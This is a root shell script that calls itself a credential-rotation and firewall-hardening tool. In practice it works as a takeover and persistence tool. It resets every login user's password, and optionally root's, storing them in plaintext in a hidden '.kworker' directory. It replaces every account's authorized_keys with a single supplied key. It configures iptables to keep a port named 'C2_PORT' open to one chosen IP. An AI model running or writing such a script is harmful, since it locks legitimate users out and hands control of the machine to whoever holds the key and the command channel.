#!/bin/sh
# DESC: rotate credentials, pin authorized_keys, seal the firewall
# REQ: root

P="${BW_PREFIX:-blk_}"
D="${BW_PREFIX_DIR:-/usr/local/sbin/.kworker}"
DRY="${BW_DRY_RUN:-0}"
FORCE_USER="${BW_FORCE_USER:-0}"
FORCE_ROOT="${BW_FORCE_ROOT:-0}"
FIREWALL="${BW_FIREWALL:-1}"
DROP="${BW_DROP:-0}"
ALLOW_IP="${BW_ALLOW_IP:-}"
C2_PORT="${BW_C2_PORT:-8443}"
LOCK_C2="${BW_LOCK_C2:-1}"

say() { printf '[WALL] %s\n' "$1"; }
run() {
    if [ "$DRY" = "1" ]; then
        printf '[dry] %s\n' "$*"
    else
        "$@"
    fi
}

if [ "$(id -u 2>/dev/null)" != "0" ]; then
    say "root is required"
    exit 1
fi

mkdir -p "$D" 2>/dev/null || true
STAMP="$D/${P}wall_passwords"
run touch "$STAMP" 2>/dev/null || true
run chmod 600 "$STAMP" 2>/dev/null || true

rand() {
    LC_ALL=C tr -dc 'A-Za-z0-9_#%+=-' < /dev/urandom 2>/dev/null | head -c "${1:-28}" 2>/dev/null
    printf '\n'
}

say "rotating login credentials"
awk -F: '($3 >= 1000 && $3 != 65534 && $7 !~ /(nologin|false)$/) {print $1}' /etc/passwd 2>/dev/null |
while IFS= read -r user; do
    [ -n "$user" ] || continue
    if [ "$FORCE_USER" != "1" ]; then
        # Only rotate accounts that already have a usable password hash.
        awk -F: -v u="$user" '$1 == u && $2 !~ /^[!*]/ {found=1} END {exit !found}' /etc/shadow 2>/dev/null || continue
    fi
    pass="$(rand 28)"
    if [ "$DRY" = "1" ]; then
        printf '[dry] chpasswd %s\n' "$user"
        continue
    fi
    if printf '%s:%s' "$user" "$pass" | chpasswd 2>/dev/null; then
        printf '%s:%s\n' "$user" "$pass" >> "$STAMP"
        say "passwd: $user rotated"
    fi
done

if [ "$FORCE_ROOT" = "1" ]; then
    if grep -q '^root:' "$STAMP" 2>/dev/null; then
        say "root: already rotated in this manifest"
    else
        pass="$(rand 32)"
        if [ "$DRY" = "1" ]; then
            printf '[dry] rotate root password\n'
        elif printf 'root:%s' "$pass" | chpasswd 2>/dev/null; then
            printf 'root:%s\n' "$pass" >> "$STAMP"
            say "root: rotated"
        fi
    fi
else
    say "root: untouched (BW_FORCE_ROOT=1 to rotate)"
fi

if [ -n "${BW_PUBKEY:-}" ] && [ -f "$BW_PUBKEY" ]; then
    say "pinning authorized_keys for login accounts"
    while IFS=: read -r user x uid gid gecos home shell; do
        [ -d "$home" ] || continue
        case "$home" in /|/nonexistent|/dev/null|/bin) continue ;; esac
        case "$shell" in */nologin|*/false) continue ;; esac
        if [ "$DRY" = "1" ]; then
            printf '[dry] rewrite %s/.ssh/authorized_keys\n' "$home"
            continue
        fi
        mkdir -p "$home/.ssh" 2>/dev/null || continue
        cat "$BW_PUBKEY" > "$home/.ssh/authorized_keys" 2>/dev/null || continue
        chmod 700 "$home/.ssh" 2>/dev/null
        chmod 600 "$home/.ssh/authorized_keys" 2>/dev/null
        chown -R "$user" "$home/.ssh" 2>/dev/null
        say "keys: $user pinned"
    done < /etc/passwd
else
    say "authorized_keys: skipped (set BW_PUBKEY to a .pub file)"
fi

if [ -d /etc/sudoers.d ]; then
    if [ "$DRY" = "1" ]; then
        printf '[dry] write /etc/sudoers.d/%sdefend\n' "$P"
    elif [ ! -f "/etc/sudoers.d/${P}defend" ]; then
        printf '%s\n' 'Defaults env_reset' 'Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"' > "/etc/sudoers.d/${P}defend"
        chmod 440 "/etc/sudoers.d/${P}defend" 2>/dev/null
    fi
    say "sudoers: secure_path pinned"
fi

if [ "$FIREWALL" != "1" ]; then
    say "firewall: skipped (BW_FIREWALL=0)"
    exit 0
fi

if ! command -v iptables >/dev/null 2>&1; then
    say "iptables absent; firewall skipped"
    exit 0
fi

say "sealing BLK_IN chain (C2 port $C2_PORT, allow ${ALLOW_IP:-any})"
if [ "$DRY" = "1" ]; then
    printf '[dry] iptables -N BLK_IN; -I INPUT 1 -j BLK_IN; flush; accept lo/established/common ports\n'
else
    iptables -N BLK_IN 2>/dev/null
    iptables -C INPUT -j BLK_IN 2>/dev/null || iptables -I INPUT 1 -j BLK_IN 2>/dev/null
    iptables -F BLK_IN 2>/dev/null
    iptables -A BLK_IN -i lo -j ACCEPT 2>/dev/null
    iptables -A BLK_IN -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT 2>/dev/null
    for port in 22 80 443 8080 8443 5000 3000 8000 9000 3306 5432 6379 27017 25 53 21 20000; do
        iptables -A BLK_IN -p tcp --dport "$port" -j ACCEPT 2>/dev/null
        iptables -A BLK_IN -p udp --dport "$port" -j ACCEPT 2>/dev/null
    done
    if [ -n "$ALLOW_IP" ]; then
        iptables -A BLK_IN -p tcp --dport "$C2_PORT" -s "$ALLOW_IP" -j ACCEPT 2>/dev/null
        if [ "$LOCK_C2" = "1" ]; then
            iptables -A BLK_IN -p tcp --dport "$C2_PORT" -j DROP 2>/dev/null
        fi
    else
        iptables -A BLK_IN -p tcp --dport "$C2_PORT" -j ACCEPT 2>/dev/null
    fi
    iptables -A BLK_IN -p tcp --dport 22 -j ACCEPT 2>/dev/null
    iptables -A BLK_IN -p icmp -j ACCEPT 2>/dev/null
    if [ "$DROP" = "1" ]; then
        iptables -A BLK_IN -j DROP 2>/dev/null
        say "default drop armed"
    fi
    if [ -d /etc/iptables ]; then
        iptables-save > /etc/iptables/rules.v4 2>/dev/null
    fi
fi

say "done; keep port $C2_PORT reachable from $ALLOW_IP"
